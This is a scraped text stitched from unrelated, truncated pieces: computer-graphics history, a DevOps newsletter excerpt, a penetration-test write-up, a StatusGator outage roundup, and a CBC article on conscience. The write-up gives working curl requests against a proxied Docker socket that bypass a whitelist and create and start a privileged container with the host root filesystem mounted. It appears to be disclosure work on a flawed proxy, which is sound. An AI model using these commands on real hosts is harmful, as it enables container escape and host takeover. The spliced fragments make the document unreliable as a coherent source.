was simply meant to read out the computer's current state. This remained true
for some time since no one thought of the computer in any other fashion than a
pure computational device. It was not until 1961 when Ivan Sutherland developed
a computer program called Sketchpad for his thesis at MIT that would change the
way we look at computers dramatically.</p>

<p>Sutherland's Sketchpad program allowed users to draw geometrical shapes onto a
CRT with a light pen in real-time, something that was groundbreaking at the
time and remains remarkable even many years after. It not only defined computer
graphics, but also introduced the precursor of a GUI (pronounced "gooey," which
stands for Graphic User Interface) and laid the foundations of what was to
become a concept known as Object Oriented Programming. Sketchpad created a
paradigm shift in that computers were no longer simply number crunching
devices, but could also be used to display geometric shapes.</p>

<div>
  <p><strong>FYI: Real-Time Computer Graphics</strong></p><p>
    Real-time computer graphics are generated on the fly, and usually in
    response to the user's input from a mouse, keyboard, or any other input
    device. Real-time graphics are often applied in applications such as video
    games and design programs.
  </p>
</div>

<p>In 1968, Ivan Sutherland and Bob Sproull engineered another technological feat,
namely "The Sword of Damocles," the forerunner of what we now call virtual
reality. This system displayed simple three-dimensional wireframe models to the
user through a headset, suspended from a ceiling because of its weight. This in
itself may have been one of the first (if not the first) time a form of 3D
graphics were generated by a computer.</p>

<h2>Smaller, Faster, Cheaper</h2>

<p>Of course, technology didn't just jump from punch cards to interactive
graphics; computers gradually evolved from massive machines to the small
devices that you use every day.</p>

<p><img src="https://openglbook.com/images/Eniac-300x229.jpg" title="Eniac, a famous first generation computer (Source: 2)" alt="Eniac, a famous first generation computer (Source: 2)"></p>

<p>From the 1940s to the mid-1950s, computers used vacuum tubes for processing and
would take up entire rooms. A vacuum tube is a device that can modify an
electronic signal in some way or another, such as switching, which is a
function that is imperative to computing. The components required to assemble a
computer were big and ran hot to the touch. None of the machines built during
this era were the same, and thus, their programs were not compatible with any
other machine. This era is usually referred to as the <strong>first generation</strong> of
computers and represents the first step in modern computer science. These are
the machines mentioned in the first section that used punch cards and lamps as
output devices, so they contributed little to the development of computer
graphics.</p>

<p>Transistors started to replace vacuum tubes during the mid 1950s, creating the
smaller, faster, cheaper, and more energy efficient computers of the <strong>second
generation</strong>. Transistors not only allowed for the creation of smaller
computers due to their small size, but ushered in a whole new generation of
consumer electronics as well. Radios, for example, could now be powered by
batteries and carried around, whereas before they were heavy stationary boxes.</p>

<p>But transistors themselves were not the Holy Grail for computing, and in the
mid-1960s, a new technology called the Integrated Circuit brought forth the
<strong>third generation</strong> of computers. Integrated Circuits miniaturized a certain
function that would normally have been performed by a series of individual
transistors onto a single chip. During the third generation, many computers
were being equipped with devices such as the keyboard, monitors, and a new type
of software called the Operating System, which allowed the computer to run
multiple programs. An important Operating System from this era was called UNIX,
which would influence many (if not all) following developments in Operating
Systems.</p>

<p><img src="https://openglbook.com/images/Intel-4004-300x157.jpg" title="The Intel 4004 Microprocessor -- the little chip that started it all (Source: 3)" alt="The Intel 4004 Microprocessor -- the little chip that started it all (Source: 3)"></p>

<p>In 1971, a major breakthrough in the field of computing occurred with the
invention of the microprocessor by the Intel Corporation, ushering in the
<strong>fourth generation</strong> of computers. Whereas CPUs (Central Processing Units)
normally were boards with many Integrated Circuits soldered onto it, the
Intel's 4004 microprocessor contained all of this functionality on a single
chip. Because of a cheaper production process, the computer slowly transitioned
from being a specialized device used by large companies and governments to
something much more accessible to the masses. We are currently still in the
fourth generation of computers, since we have not yet moved away from microprocessors.</p>

<h2>Personal Computing</h2>

<p><img src="https://openglbook.com/images/Apple_II-300x264.png" title="The Apple II Plus (1979) showing color display capabilities (Source: 4)" alt="The Apple II Plus (1979) showing color display capabilities (Source: 4)"></p>

<p>The first Personal Computers started to appear in the mid to late 1970s, but
were regarded as enthusiast machines for hobbyists. This changed somewhat with
the release of the Apple II by Apple Computer in 1977, and the PET by Commodore
International. These machines popularized the concept of computers for the
home, but did not have too much to offer in terms of computer graphics.</p>

<p>This somewhat changed in the 1980s when technologies such as GUI were
introduced to the personal computing market. The first dedicated graphics
add-on cards also started to appear during this era, notably the CGA (Color
Graphics Adapter) by IBM was the first color graphics card for the IBM PC
platform, which would pave the way for future developments by standardizing a
method of drawing computer graphics but didn't offer much in terms of graphics
capabilities.</p>

<p>During the 1970s and 1980s, most video games ran on specialized systems, movies
made use of computer animation only sparsely, and real-time 3D graphics were
for visualization purposes only since there was no consumer hardware that was
fast enough. These years were known for their many firsts on consumer hardware,
but it wasn't until the late 1980s to the early 1990s when computer games took
a strong hold on the PC platform and a real push for better looking and better
performing real-time graphics began.</p>

<p>One of the computer games that pushed what was possible on the hardware of the
day was Wolfenstein 3D, a first-person shooter released in 1992 by id Software.
While Wolfenstein wasn't truly 3D it defined the standard for future 3D
computer games. Only a year later, id Software released Doom, their first true
3D game. For the first time, the player could explore their environment through
the use of staircases and elevators, without being stuck to a certain
elevation. Many games followed that imitated the look and feel of Doom, and
were aptly dubbed "Doom-clones." Doom used a software …</p></div></div>

A few Kubernetes contributors are jumping ship from VMware. Four in a little over a week is nothing short of a sign, though. These aren’t the kinds of folks who like to hang out in big corporate orgs and feel like cogs in the machine. They want to feel like they’re making an impact and see the value in their work. They, like Deming, appreciate and take pride in their work. There is nothing at all wrong with this. I 100% understand, given that Red Hat is the biggest organization I’ve ever been a part of outside the Air Force. I can understand the appeal of the late-stage startup life too.</p><p>But, there is comfort in working for a 25-year-old organization inside a much larger organization that probably won’t muck with us too much given the current global situation. VMware completely sucked all the Heptio out of Heptio the second they started renaming and rebranding Heptio projects to VMware products. I have to hand it to Red Hat. Realizing that the CoreOS name meant something and keeping some of its projects active and incorporating the CoreOS name into products shows that at the very least, Red Hat appreciated CoreOS’s work. I don’t know if the same can be said for VMware of Heptio. Perception is often reality in these instances because we’ll never know otherwise unless folks speak up (which they are often not allowed to).</p><p><strong>DevOps’ish is brought to you by</strong> <a href="https://www.accurics.com/?utm_source=newsletter&amp;utm_medium=email&amp;utm_campaign=devopsish_181"><strong>Accurics</strong></a>.

<p>Legend has it that before his death, Harry Houdini once said: “<em>if it is truly possible for someone to return from the afterlife, I will</em>”. Despite of the fact he was a great illusionist and escape artist, it seems this last proof has revealed to be very hard, even for him. Much simpler trying to escape out of a container. Of course a docker container 🙂 … our topic for today.</p>



<p>The danger of exposing “<code>docker.sock</code>” to a docker container is well-known and the security literature is full of examples (one is <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">here</a>) leading to container escape and privilege escalation issues in the host machine. But sometimes this is required (if not even necessary) for legitimate purposes, like creating other containers or pushing configuration settings. While the docker security guidelines advocate to not share the Docker UNIX socket inside a container, at the same time the project developers do not give any advice on how to secure such a kind of configuration whenever it is needed for “<em>good reasons</em>”. And that’s why so many companies that adopt docker and deliver services based on it, still today, suffer from this problem.</p>



<p>For example, last year a customer of us has contracted a security firm to check the robustness of their docker infrastructure. One of their main findings was the file “<code>docker.sock</code>” being mounted within some of their containers, which of course was a sufficient condition to compromise the entire host operating system. In the absence of a strong solution coming from the community, our customer has decided to build its own solution. They created a reverse proxy in front of the Docker UNIX socket file that would add authentication/authorization, and would prevent insecure utilization of the Docker socket itself.</p>



<p>Then they asked us to test the new architecture. This is the story of how the sympathetic Red Timmy has managed to bypass it.</p>



<h3>The architecture</h3>



<p>Before moving forward, we must explain a bit the implementation we have been called to test and a picture should make the job easy enough.</p>



<figure><img loading="lazy" width="1024" height="511" src="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png" alt="" srcset="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png 1024w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-300x150.png 300w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-768x383.png 768w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker.png 1099w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In this architecture there are two UNIX socket files now:</p>



<ul><li><code>/var/run/docker.sock</code> is not exposed within the docker containers anymore. It is readable and writable only for the “<code>root</code>” user and the “<code>docker</code>” group. As you already know the docker engine uses it directly.</li><li><code>/var/run/somethingelse.sock</code> is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “<code>/var/run/docker.sock</code>”. The docker engine remains the only one able to do that.</li></ul>



<p>Then a reverse proxy, running as a privileged user, sits in the middle of these two UNIX socket files. It fetches requests from “<code>/var/run/somethingelse.sock</code>” and determines whether or not these must be forwarded to “<code>/var/run/docker.sock</code>” based on a whitelist of authorized values preemptively saved in a configuration file. For example, a request could be let pass through only if it matches a specific HTTP method (<em>GET</em>, <em>POST</em>, etc…), path (for example “<code>/containers/create</code>”) and/or JSON body.</p>



<p>At the same way the reverse proxy returns the replies from “<code>docker.sock</code>” to “<code>somethingelse.sock</code>” once they are in the pipeline. At first glance the workflow looked fine and flawless.</p>



<h3>Let the dance begin</h3>



<p>Ok, all clear. We have been provided with access to a docker container:</p>



<div><div>
<div><p><code>[root@dockerhost ~]# <strong>docker exec -it 7c4e2742becb bash</strong><br>bash-4.4$</code> &lt;-- container command prompt</p></div>
</div></div>







<p>Also our handsome UNIX socket file is where it is supposed to be:</p>



<p><code>bash-4.4$ <strong>ls –al /var/run/somethingelse.sock</strong><br>srw-------  1 unpriv root 0 Feb 13 11:31 somethingelse.sock</code></p>



<p>Now we must find a way to escape out of there. First thing we try is to leverage the “old” trick as documented in the report that our customer has received from the security firm they had originally contracted:</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong> "</strong>AttachStdout<strong>"</strong>: true,<strong> "</strong>AttachStderr<strong>"</strong>: true,<strong> "</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash”,”Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost<strong>/containers/create</strong></code></p>



<p>The main difference in our command is that instead of establishing a communication channel with “<code>/var/run/docker.sock</code>” (not mounted in the container) we target “<code>/var/run/somethingelse.sock</code>” (which is instead mounted in the container). All the hacking steps are performed with curl. Specifically, as we are communicating with a UNIX domain socket, the “<code>--unix-socket &lt;filename&gt;</code>” option is adopted.</p>



<p>The command above is the same (a bit extended) as specified in the section “<strong><em>Create the container with the mounted volume</em>” </strong>of this online <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">tutorial</a>, which the penetration tester had linked into his report. I strongly suggest you to read that post before going ahead with this one, if you are not familiar with the technique in general. Anyway, even if you are not familiar, below follows a short explanation of what we were trying to do with that command.</p>



<p>Basically, from inside the container we are in, we are trying to <strong>create</strong> another container that, once started, will have the root directory “<strong><code>/</code></strong>”of the host operating system mounted under its “<strong><code>/hostos/</code></strong>” folder. If that can be done, it is game over. Just connecting to the new container and launching the command “<code>chroot /hostos</code>” would provide the attacker with full access to the host operating system and all its files.</p>



<p>In our case instead the reverse proxy replied with:</p>



<p><code>HTTP/1.1 403 Forbidden</code></p>



<p>Honestly it was expected. Something else had to be attempted.</p>



<h3><strong>Time for circumvention</strong></h3>



<p>After a bit of trial and error we understand that the stricter check is performed on the value passed to “<code>Binds</code>”. When we provide the string “<code>/:/hostos</code>” trying to map the filesystem “<code>/</code>” of the host into the “<code>/hostos</code>” directory of the container, the request is rejected because the specified string is not in the whitelist. However we discovered, for example, that “<code>/dev/log:/dev/log</code>” is an accepted value instead. It means the reverse proxy allows us to create a container from inside another container when that value is provided. Of course there is nothing special with using “<code>/dev/log</code>” to bypass the filter. But what if the strings “<code>/:/hostos</code>” and “<code>/dev/log:/dev/log</code>” are both specified as part of the same “<code>Binds</code>” parameter, like below?</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong>"</strong>AttachStdout<strong>"</strong>: true,<strong>"</strong>AttachStderr<strong>"</strong>: true,<strong>"</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash<strong>"</strong>,<strong>"</strong>Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost/containers/create</code></p>



<p>Unexpectedly, the reverse proxy replies with:</p>



<p><code>HTTP/1.1 201 Created<br>Api-Version: 1.39<br>Content-Length: 90<br>Content-Type: application/json<br>Date: Fri, 15 May 2020 08:19:58 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)<p>{"Id":"4fa6bfc84930[...]","Warnings":null}</p></code></p>



<p>So it means we are allowed to create a new container where the root of the host filesystem is mounted into its “<code>/hostos</code>” directory. To confirm that, we manually started the newly created container from the host OS and then accessed it. This was what we got…</p>



<p><code>[root@4fa6bfc84930 opt]# <strong>ls -al /hostos/</strong><br>[...]<br>drwxr-xr-x. 102 root root 8192 May  6 09:08 etc<br>drwxr-xr-x.   6 root root   56 Feb  7  2018 home<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 media<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 mnt<br>drwxr-xr-x.  17 root root 4096 Mar 24  2017 nfs<br>drwxr-xr-x.   7 root root  106 Jan  7  2019 opt<br>dr-xr-xr-x. 375 root root    0 Nov 23 08:23 proc<br>dr-xr-x---.   8 root root 4096 May 14 13:51 root<br>drwxr-xr-x.  35 root root 1140 May  6 09:08 run<br>lrwxrwxrwx.   1 root root    8 Jan 18  2018 sbin -&gt; usr/sbin<br>[...]</code></p>



<p>…meaning that from inside the container we have total control over the entire host OS filesystem, which is what the reverse proxy implementation was attempting to prevent. Good, but how was that possible? Well, let’s have a look once more at the interested part that made the trick possible:</p>



<p><strong><code>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</code></strong></p>



<p>It seems that in case just one of the strings given to the “<code>Binds</code>” parameter is present in the whitelist, the whole check is considered passed, regardless of the presence of other values that are instead not defined in the whitelist configuration. The logic of the reverse proxy was clearly flawed.</p>



<h3><strong>Start the container just created</strong></h3>



<p>So from inside the current container we have managed to create a new one with full access to the host OS filesystem. But we have not executed anything in the host OS yet…and we are still confined within our unprivileged container.</p>



<p><code>bash-4.4$</code></p>



<p>Let’s try to get out of here. First of all let’s see if after its creation we can also start the container from the place where we are now:</p>



<p><code>curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/<strong>4fa6bfc84930</strong>[...]/start</code></p>



<p>As indicated in the <a href="https://docs.docker.com/engine/api/v1.39/#operation/ContainerStart" target="_blank" rel="noreferrer noopener">Docker API</a> the endpoint to target this time is “<code>/containers/{ID}/start</code>”, where ID (in bold above) is the value the reverse proxy has returned to us with the previous request. The reply we get is:</p>



<p><code>HTTP/1.1 204 No Content<br>Api-Version: 1.39<br>Date: Fri, 15 May 2020 08:20:34 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)</code></p>



<p>It means we are allowed to do that. So far, so good. Now the high privileged container is started and we want to execute a command in …</p></div></div>

<p>Anything bad that can happen — will happen. This old adage applies 100% to the technology industry, where crashes and outages are far more common than the sales and marketing teams would want us to think. However, DevOps engineers that deal with infrastructure know how hard it is to ensure everything works as intended all of the time — and to configure monitoring that actually keeps track of a system’s health and helps prevent crashes and downtime.&nbsp;</p>
<p>At <a href="https://statusgator.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">StatusGator </a>we monitor the status pages of more than 800 cloud-based services and deliver instant notifications to our users. We have mountains of data on downtime and outages and see the full picture, so we decided to make a quarterly top downtime list. We hope our findings will motivate DevOps engineers to see how others deal with service outages so they can improve their own reliability.&nbsp;</p>
<p>Read on to find out about the five biggest outages of Q2 2020 and how Slack, Zoom, GitHub, IBM Cloud and T-Mobile acted during these crises. We also rate the outcomes of these outages and would be glad to hear your thoughts on our ratings.</p>
<h2>Outage #1 – <strong>World-wide Slack outage, May 12, 2020</strong></h2>
<p>Slack is the primary means of communication for thousands of companies worldwide, so its stable uptime is a matter of utmost importance. Thus, when users stopped being able to send and receive Slack messages around 7:30 PM EDT, the situation quickly escalated into a full-scale problem. Unlike during previous outages, this affected the entire Slack ecosystem: nobody could log in to Slack or receive any notifications. “Is Slack down?”, the users asked themselves and the answer was an undeniable “Yes!”</p>
<figure><a href="https://statusgator.com/users/sign_up" target="_blank" rel="noopener noreferrer follow" data-wpel-link="internal"><img src="https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-1024x452.png" alt="Cloud provider down?" srcset="https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-1024x452.png 1024w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-300x132.png 300w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-768x339.png 768w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-1536x678.png 1536w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-720x318.png 720w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-580x256.png 580w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1-320x141.png 320w, https://statusgator.com/blog/wp-content/uploads/2020/08/SG-CTA1.png 1866w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>
<p>Anyone using the Slack Electron app was getting a generic HTTP error. Even the next day, after the issue had been resolved, people using the Slack app were still seeing the same error message. The app doesn’t refresh automatically so it was confusing for non-technical users, many of whom didn’t know they had to press Ctrl-R to refresh the app and restore service after the error.</p>
<p>The company confirmed they were aware of a situation and posted regular updates to <a href="https://status.slack.com/2020-05/147dad376c8946ff" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">the Slack status page</a>. Quite importantly, these updates were not standardized ‘we are aware of the situation, please stand by’ responses.</p>
<figure></figure>
<p>Team representatives wrote detailed messages that showed customers the Slack team were transparent about the challenge they faced and the efforts they made to overcome it.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">We are seeing performance improvements and you may be able to connect once again. We're working to fully restore service for everyone. Thank you for bearing with us.</p>— Slack (@SlackHQ) <a href="https://twitter.com/SlackHQ/status/1260378685334409216?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 13, 2020</a></blockquote>
</div></figure>
<p>At 10:26 PM EDT Slack reported full restoration of services and apologized for the inconvenience once again. Even more importantly, they published a detailed <a href="https://slack.engineering/a-terrible-horrible-no-good-very-bad-day-at-slack-dfe05b485f82" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">postmortem</a> on Medium, explaining the reasons behind the issue, the actions they performed to overcome it, the conclusions they came to, and the measures they were undertaking to eliminate the chance of a similar situation happening again.</p>
<p>Feel free to read this postmortem, it is very technical yet quite understandable even for laypersons. Slack demonstrates here that they care about members of their user base — both developers and the mass user base, and the confidence this article projects is admirable.</p>
<p>An important thing to note here is that while the issue itself started at 8:30 AM EDT, the issue went completely under the radar till around 7:30 PM EDT when multiple users reported issues with Slack. They reported them inside the app (which was mostly down by that time), on Twitter, on Downdetector, on the Slack website (which went down too quite soon) and through many other channels, before the Slack team became aware of the situation.&nbsp;</p>
<p>Getting notified about an outage would have been much faster and easier with StatusGator, where you can aggregate multiple status pages into one dashboard. StatusGator can send centralized notifications on downtimes for any services and APIs, and you can enjoy it with a <a href="https://statusgator.com/plans" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">free subscription plan</a>!</p>
<h2>Outage #2 – <strong>Zoom shutdown, May 17, 2020</strong></h2>
<p>Zoom usage has gone up dramatically since the Coronavirus pandemic began as more people work and study remotely. So have subscriptions to the Zoom status page, which have skyrocketed in StatusGator since April.&nbsp;</p>
<figure><img src="https://lh4.googleusercontent.com/2sgE3LGne0_xP2m3OP2ekivYBcg0PAOYeLqKRhTfEHZH6obapJBvPpiDy-1aYNSeaTUbgl220ZStj5_YWrayRzGfOvY6Uqt1WOLd4qQRDYTZAYgWcYAmqmLkoCOJvbQhTmRmswLA" alt=""></figure>
<p>Aside from businesses being forced to begin working remotely, many churches and other public organizations started using Zoom to hold Sunday masses, meetings, and to host public events. Thus, while Sunday is not a business day, many paid accounts in the UK quickly noticed that they were not able to host or join Zoom meetings (free accounts seemed not to be affected). The issue was reported through multiple channels, including Twitter and StatusGator that monitors the status of Zoom.</p>
<p>A Zoom spokesperson responded, acknowledging awareness of the situation and mentioning it was only affecting a subset of users. However, we all know a subset might be 1% or 99% and Zoom provided no indication whatsoever as to the volume of users affected. Providing more transparency into the percentage of affected users is a hallmark of a quality status page, something Zoom should improve.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Hi there – We have received reports that Zoom users may be experiencing issues hosting and joining meetings. Please see <a href="https://t.co/aqz5nS7fZY" data-wpel-link="external" target="_blank" rel="nofollow">https://t.co/aqz5nS7fZY</a> for updates.</p>— Zoom (@zoom_us) <a href="https://twitter.com/zoom_us/status/1262025037999214595?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 17, 2020</a></blockquote>
</div></figure>
<p>The issue was reported resolved by 11:40 AM EDT, but Zoom provided no explanation or postmortem of any kind. Such an attitude, along with <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/27/21197090/zoombombing-zoom-stop-how-to-porn-trolls-video-chat-screen-sharing" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Zoombombing</a> and a “Company Directory” checkbox in settings allowing users to <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/31/21201956/zoom-leak-user-information-email-addresses-photos-contacts-directory" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">leak corporate photos and emails</a> is one of the reasons many users are now actively seeking better alternatives to Zoom.</p>
<h2>Outage #3 – <strong>GitHub was inaccessible… Again. June 29, 2020</strong></h2>
<p>GitHub seems to be down a lot more since its $7.5 billion <a aria-label="undefined (opens in a new tab)" href="https://blogs.microsoft.com/blog/2018/10/26/microsoft-completes-github-acquisition/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">acquisition by Microsoft</a>. The reasons have not been disclosed, and we can only speculate on the causes. Maybe it has something to do with integrating GitHub infrastructure with Microsoft systems. Maybe it’s because GitHub has been moving faster and adding more features. In any case, it’s been almost two years since the acquisition, and users are noticing more sustained periods of downtime at GitHub. Our independent <a aria-label="undefined (opens in a new tab)" href="https://statusgator.com/blog/2020/06/04/has-github-been-down-more-since-its-acquisition-by-microsoft/" target="_blank" rel="noreferrer noopener follow" data-wpel-link="internal">analysis of the GitHub status page</a> confirms that the outages became more frequent over the past two years.</p>
<p>Microsoft is working hard to turn GitHub into an even better place for developers than it was before. The Redmond giant made all of the paid plans more affordable earlier this year and offered some key features for free to place more tools at the disposal of IT professionals. Microsoft, Apple, AWS, Google, Facebook and thousands of other companies use GitHub to store and run their code repositories, so its uptime is of utmost importance.</p>
<p>Nevertheless, GitHub was down for two hours on June 29, 2020. The entire website and its services were inaccessible, so many developers were not even able to push code or deploy their apps due to the number of GitHub integrations that were unresponsive. Naturally, this caused a major backlash and caused <a aria-label="undefined (opens in a new tab)" href="https://github.blog/2020-07-08-introducing-the-github-availability-report/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">GitHub to introduce a monthly availability report</a> in addition to its status page, providing detailed explanations of the reasons and outcomes of every outage.&nbsp;&nbsp;</p>
<h2>Outage #4 – <strong>IBM Cloud went down along with the status page, June 10, 2020</strong></h2>
<p>One of the biggest mistakes any cloud-based service can do is to host its status page on its own infrastructure. It appears IBM Cloud did just that, so when its whole infrastructure became inaccessible for several hours in June, its status page followed suit. We could have expected IBM to draw some conclusions after the <a href="https://www.datacenterdynamics.com/en/news/ibm-cloud-struggles-suffers-small-outage-dallas/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">Dallas downtime this March</a>, but, apparently, they did not bother, or did not make enough effort.</p>
<p>Thus, on June 10, 2020, the IBM Cloud infrastructure went down globally. This outage rendered features like Watson AI, IBM Cloud Foundry, Kubernetes Service, Cloud Object Storage, Identity Access and Management, VPN for VPS, App Connect and others completely inaccessible. Fortunately, the IBM Cloud status page was unavailable only in the early stages of the outage and became available intermittently later. That’s why StatusGator was still able to send alerts to users who had subscribed to the IBM Cloud status page.</p>
<p>The company totally failed to communicate the reasons for the outage, as well as the steps it took to alleviate the impact. It later became known from an independent monitoring service, that a 3rd-party network provider had extensively used the traffic routes, which resulted in severe constraints on the IBM Cloud configuration bandwidth. IBM specialists reconfigured their systems and restored operations, but no official explanations or announcements ensued — much to the disappointment of users.&nbsp;</p>
<p>It is not the first time IBM has failed at public relations, nor, we think, will it be the last. This is probably one of the reasons for them to fall so far behind AWS, Google Cloud Platform, Microsoft Azure, and other cloud providers, despite delivering a diverse range of competitive cloud services.</p>
<p>But what could IBM have done? Had an independent status page, naturally! Below are just some of the variants they could have used:</p>
<ol><li><a aria-label="undefined (opens in a new tab)" href="https://statuspage.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">StatusPage.io</a>. The largest and most popular platform around. This is probably the only provider big enough to handle companies like IBM Cloud.</li><li><a aria-label="undefined (opens in a new tab)" href="https://status.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Status.io</a>. Another large and widely used status page provider with infrastructure meeting the scale that IBM Cloud would require.&nbsp;</li><li>Alternatively, they could build their own status page, being careful <a href="https://statusgator.com/blog/2020/04/21/your-status-page-deserves-its-own-domain/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">not to be dependent on any of their own infrastructure</a>. IBM could host it as a static page on a third-party CDN to reduce complexity and dependency on its network.</li></ol>

<h2>Outage #5 – <strong>T-Mobile Flushes Its Network Down the Drain, June 15, 2020</strong></h2>

And why should we trust it?</p>  <p>As Leonard Cohen once sang, "I don't trust my inner feelings. Inner feelings come and go." The famed Montrealer was reiterating a point made by Socrates right at the beginnings of Western philosophy. The inner voice can mislead us.</p>  <p>For <a href="https://patriciachurchland.com/" target="_blank">Patricia Churchland</a>, professor emerita in philosophy at University of California San Diego, it's instructive to know more about the origins of our human consciences. She argues the starting point could be as early as the first warm-blooded animals more than 200 million years ago.&nbsp;</p>  <p>What began as an adaptation to foraging in cold or nighttime environments spurred further adaptations, such as a propensity to nurture, socialize, and learn from others.</p>  <p>Brain structures encouraging social behaviour took mammals right up to the doorstep of what we call morality in humans.</p>  <p>"I don't think that human behaviour is different in kind from the behaviour we see in chimpanzees, or baboons, or wolves," Churchland told <em>IDEAS</em> host Nahlah Ayed.</p>  <p>"I think it is more complicated because our ecology — especially now — is more complicated."</p>  <h2>Vole brain&nbsp;breakthrough</h2>  <p>Churchland wants the scientific research to inform what has long been a philosophical or religious conversation. Often, thinkers tried to answer questions such as "Why be good?" with appeals to reason or divine authority.</p>  <p>The biological story offers us a different answer: brain wiring.</p>  <p>"Why is [being social] so meaningful? Why do we care? We care because we're like that," said Churchland, author of&nbsp;<em><a href="https://wwnorton.com/books/9781324000891" target="_blank">Conscience: The Origins of Moral Intuition</a>.</em></p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/prairie-voles.jpg 300w,https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/prairie-voles.jpg 460w,https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/prairie-voles.jpg 620w,https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/prairie-voles.jpg 780w,https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/prairie-voles.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4144691.1582312588!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/prairie-voles.jpg"></p></div><figcaption>Prairie voles mate and bond for life, says Churchland. <!-- --> <!-- -->(Submitted by Emory University)</figcaption></figure></span></p>  <p>The philosopher explains that a key discovery for her came from research into vole biology.</p>  